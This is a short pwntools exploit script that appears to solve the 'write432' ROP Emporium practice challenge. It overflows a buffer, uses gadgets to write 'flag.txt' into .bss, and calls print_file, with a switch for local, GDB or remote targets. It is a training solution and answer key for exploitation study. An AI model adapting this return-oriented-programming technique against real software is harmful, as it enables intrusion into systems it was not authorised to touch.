from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *pwnme + 177
continue
'''.format(**locals())

exe = './write432'
elf = context.binary = ELF(exe, checksec=False)
p = start()
pop_edi_ebp = 0x080485aa

# ===== Exploit script here =====
p.sendlineafter(b'> ', flat(
    b'A'*44,
    pop_edi_ebp,
    elf.bss() + 0x100,
    b'flag',
    elf.sym['usefulGadgets'],
    pop_edi_ebp,
    elf.bss() + 0x104,
    b'.txt',
    elf.sym['usefulGadgets'],
    elf.plt['print_file'],
    b'A'*4,
    elf.bss() + 0x100,
))

p.interactive()